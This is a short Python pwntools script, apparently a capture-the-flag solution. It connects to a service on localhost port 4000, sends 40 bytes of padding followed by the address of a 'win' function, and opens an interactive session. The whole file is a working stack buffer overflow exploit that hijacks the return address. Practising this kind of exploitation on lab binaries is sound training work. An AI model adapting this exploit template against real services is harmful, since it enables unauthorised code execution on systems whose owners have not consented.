from pwn import *
r = remote('localhost', 4000)

offset = 40
win = 0x00400676  

payload = b'A' * offset
payload += p64(win)

r.sendline(payload)
r.interactive()
